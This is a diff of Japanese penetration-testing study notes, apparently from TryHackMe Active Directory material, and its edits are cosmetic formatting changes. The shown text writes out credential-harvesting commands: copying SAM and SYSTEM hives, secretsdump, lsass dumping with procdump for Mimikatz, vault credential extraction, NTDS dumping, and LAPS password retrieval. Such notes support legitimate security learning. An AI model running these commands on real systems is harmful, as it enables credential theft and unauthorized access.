@@ -258,7 +258,7 @@ copy <ShadowCopyPath>\windows\system32\config\sam <output_path>
 copy <ShadowCopyPath>\windows\system32\config\system <output_path>
 ```
 
-4. ローカルで復号
+4. ローカルマシンにダウンロードし、復号
 ```zsh
 impacket-secretsdump -sam <SAMデータベースのファイルフルパス> -system <システムレジストリファイルのフルパス> LOCAL
 ```
@@ -283,14 +283,14 @@ impacket-secretsdump -sam <SAMデータベースのファイルフルパス> -sy
 
 3.  ダンプされたプロセスをMimikatzフォルダにコピー
 ```cmd
-copy [path to lsass.DMP] C:\Tools\Mimikatz\lsass.DMP
+copy <path_to_lsass.DMP> C:\Tools\Mimikatz\lsass.DMP
 ```
 
 ## Sysinternals Suite
 
 - GUIが使えない場合の代替手段
-- [Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)というツールのProcdumpを使用する
-- （AntiVirus製品に検知されやすい）
+- 🔗[Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)のProcdumpを使用する
+- AntiVirus製品に検知されやすい
 ```cmd
 procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
 ```
@@ -311,7 +311,7 @@ procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
 vaultcmd /list
 ```
 - デフォルトでは、Windowsには2つのvaultがあり、1つはWeb用、もう1つはWindowsマシンCreds用
-- （GUIでは、Control Panel -> User Accounts -> Credential Managerからアクセスできる）
+- GUIでは、Control Panel -> User Accounts -> Credential Managerからアクセスできる
 
 ![](../../../画像ファイル/Pasted%20image%2020230602142505.png)
 
@@ -328,7 +328,7 @@ VaultCmd /listcreds:"Web Credentials"
 ```
 - `Hidden : No`となっていてパスワードが見れない時がある
 
-4. [Get-WebCredentials.ps1 - nishang - GitHub](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)を使用
+4. 🔗[Get-WebCredentials.ps1 - nishang - GitHub](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)を使用
 ```powershell
 Import-Module .\Get-WebCredentials.ps1
 Get-WebCredentials
@@ -370,7 +370,7 @@ Get-WebCredentials
 
 ## Ntdsutil
 
-- Ntdsutilは、ADの設定を管理・維持するためのWindowsユーティリティ([Ntdsutil](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)))
+- Ntdsutilは、ADの設定を管理・維持するためのWindowsユーティリティ(🔗[Ntdsutil](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)))
 
 - 条件：DCの管理者アクセス権限
 - NTDSファイルの内容を正常にダンプするためには、以下のファイルが必要
@@ -403,12 +403,12 @@ impacket-secretsdump -security <path_to_SECURITY> -system <path_to_SYSTEM> -ntds
 
 - LAPS機能が有効になっている場合に、AD環境内のローカル管理者パスワードを取得する
 
-==以外表にする==
-特徴 Group Policy Preferences (GPP) LAPS (Local Administrator Password Solution)
-主な目的 レジストリ、ファイル、ユーザー作成など広範な設定 ローカル管理者パスワードの管理に特化
-パスワード 全 PC で共通（固定値）になりがち PC ごとに固有・ランダム
-有効期限 なし（手動で変えない限りそのまま） 自動的にローカルで定期変更（ローテーション）
-安全性 極めて低い（誰でも解読可能な仕組み） 高い（AD 上に暗号化して保存、権限者のみ閲覧）
+| 特徴    | Group Policy Preferences (GPP) | LAPS (Local Administrator Password Solution) |
+| ----- | ------------------------------ | -------------------------------------------- |
+| 主な目的  | レジストリ、ファイル、ユーザー作成など広範な設定       | ローカル管理者パスワードの管理に特化                           |
+| パスワード | 全 PC で共通（固定値）になりがち             | PC ごとに固有・ランダム                                |
+| 有効期限  | なし（手動で変えない限りそのまま）              | 自動的にローカルで定期変更（ローテーション）                       |
+| 安全性   | 極めて低い（誰でも解読可能な仕組み）             | 高い（AD 上に暗号化して保存、権限者のみ閲覧）                     |
 
 ## Enumerate for LAPS
 
@@ -442,7 +442,7 @@ net groups "<GroupName>"
 runas /savecred /user:[domain]\<username> cmd.exe
 ```
 
-3. LAPSが有効になっているマシン名を入手する：[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
+3. LAPSが有効になっているマシン名を入手する：🔗[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
 ```powershell
 Import-Module .\LAPSToolkit.ps1
 Get-LAPSComputers
@@ -475,10 +475,10 @@ Get-AdmPwdPassword -ComputerName <MachineName>
 
 ## SMB Relay Attack
 
-- [5. Exploiting Active Directory](../../../TryHackME/Offensive%20Pentesting/Active%20Directory/5.%20Exploiting%20Active%20Directory.md#Exploiting%20Authentication%20Relays)
+- [Exploiting Authentication Relays](../../../TryHackME/Offensive%20Pentesting/Active%20Directory/5.%20Exploiting%20Active%20Directory.md#Exploiting%20Authentication%20Relays)
 
 ## LLMNR/NBNS Poisoning
 
-[2. Breaching Active Directory](../../../TryHackME/Offensive%20Pentesting/Active%20Directory/2.%20Breaching%20Active%20Directory.md#Authentication%20Relays)
+[Authentication Relays](../../../TryHackME/Offensive%20Pentesting/Active%20Directory/2.%20Breaching%20Active%20Directory.md#Authentication%20Relays)
 
 - SMBリレーやLLMNR/NBNSポイズニング攻撃の最終目標は、被害者の認証NTLMハッシュを取得し、被害者のアカウントやマシンへのアクセス権を取得すること
